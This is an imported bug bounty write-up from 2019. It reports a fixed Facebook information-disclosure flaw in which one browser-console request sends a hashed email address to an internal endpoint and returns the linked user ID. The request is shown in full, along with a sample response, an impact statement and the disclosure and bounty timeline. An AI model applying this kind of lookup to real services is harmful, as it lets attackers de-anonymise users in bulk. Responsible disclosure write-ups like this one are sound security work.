---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-05-22_determine-a-facebook-user-from-an-email-address.md
original_filename: 2019-05-22_determine-a-facebook-user-from-an-email-address.md
title: Determine a Facebook user from an email address
category: documents
detected_topics:
- command-injection
- otp
- automation-abuse
- information-disclosure
tags:
- imported
- documents
- command-injection
- otp
- automation-abuse
- information-disclosure
language: en
raw_sha256: 4ce36e96ae488ba60d6bbc51a23406d58fe4c23523ad41d30bd5e9652249158d
text_sha256: 3a122b8ece5b223ae60c418313c97ed26e075e59dff67bb165848676dbbf0369
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Determine a Facebook user from an email address

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-05-22_determine-a-facebook-user-from-an-email-address.md
- Source Type: markdown
- Detected Topics: command-injection, otp, automation-abuse, information-disclosure
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `4ce36e96ae488ba60d6bbc51a23406d58fe4c23523ad41d30bd5e9652249158d`
- Text SHA256: `3a122b8ece5b223ae60c418313c97ed26e075e59dff67bb165848676dbbf0369`


## Content

---
title: "Determine a Facebook user from an email address"
page_title: "Determine a Facebook user from an email address - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/determine-a-user-from-an-email-address/"
final_url: "https://philippeharewood.com/determine-a-user-from-an-email-address/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Information disclosure"]
bounty: "1,000"
publication_date: "2019-05-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5250
---

Posted on [May 22, 2019](https://philippeharewood.com/determine-a-user-from-an-email-address/)

# Determine a Facebook user from an email address

Given an email address, it is possible to identify a user ID. There are various non-trivial ways to link an email address to a user however this particular call seems as though it can be used for scraping in bulk, given, for example, a mailing list.  
  
Calling the following request in a Chrome console window will show the ID linked to an email address connected to any account (private or public).

Request
  
  
  new AsyncRequest('/newsfunding/invitesupporters/upload/').setData({email_hashes:[require('sha256')('zuck@fb.com')]}).send()
  ![](http://philippeharewood.com/wp-content/uploads/2019/06/console.png)

Actual Response
  
  
  for (;;);{"__ar":1,"payload":{"message":"Hello world!","test2":1111111},"bootloadable":{},"ixData":{},"bxData":{},"gkxData":{},"qexData":{},"lid":"1"}

1111111 is the Facebook ID linked to that account.

**Impact**

This could have let a malicious user tie an email address back to a Facebook user.

**Timeline**

May 22, 2019 – Report Sent  
May 22, 2019 – Confirmation of submission by Facebook  
May 23, 2019 – Further investigation by Facebook  
May 24, 2019 – Fixed by Facebook  
Jun 6, 2019 – $1000 Bounty Awarded by Facebook  
Feb 26, 2020 – $4000 Bounty Awarded by Facebook  
  
 _“After revisiting the payout here we have determined that our initial payout was too low. Awarding an additional 4000$ to bring the total submission to 5000$.”_
